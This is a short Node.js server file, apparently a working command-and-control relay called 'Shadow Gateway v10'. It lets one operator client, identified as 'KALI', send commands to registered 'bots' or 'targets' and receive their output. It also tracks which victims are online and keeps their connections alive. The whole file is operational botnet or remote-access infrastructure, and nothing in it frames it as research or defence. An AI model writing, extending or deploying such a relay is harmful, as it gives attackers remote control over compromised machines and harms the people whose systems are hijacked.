const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Shadow Gateway v10 - Online');
});

const wss = new WebSocket.Server({ server });

let KALI = null;
const BOTS = new Map();

wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(req.url.split('?')[1]);
    const id = params.get('id');

    if (id === 'KALI') {
        if (KALI) KALI.terminate();
        KALI = ws;
        console.log('[+] Operador David Conectado');
        // Notifica o Kali sobre todos os bots existentes
        BOTS.forEach((_, botId) => {
            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId }));
        });
    } else if (id) {
        if (BOTS.has(id)) BOTS.get(id).terminate();
        BOTS.set(id, ws);
        console.log(`[+] Alvo registrado: ${id}`);
        if (KALI && KALI.readyState === WebSocket.OPEN) {
            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
        }
    }

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (ws === KALI) {
                const target = BOTS.get(data.to);
                if (target) target.send(data.cmd);
            } else {
                if (KALI && KALI.readyState === WebSocket.OPEN) {
                    KALI.send(JSON.stringify({ t: 'res', f: id, d: message.toString() }));
                }
            }
        } catch (e) {
            // Se não for JSON, envia como resposta bruta (fallback)
            if (ws !== KALI && KALI) {
                KALI.send(JSON.stringify({ t: 'res', f: id, d: message.toString() }));
            }
        }
    });

    ws.on('close', () => {
        if (ws === KALI) {
            KALI = null;
            console.log('[-] Operador Desconectado');
        } else {
            BOTS.delete(id);
            if (KALI && KALI.readyState === WebSocket.OPEN) {
                KALI.send(JSON.stringify({ t: 'bot', s: 'off', id: id }));
            }
        }
    });

    // Keep-alive a cada 20 segundos
    const timer = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) ws.ping();
        else clearInterval(timer);
    }, 20000);
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
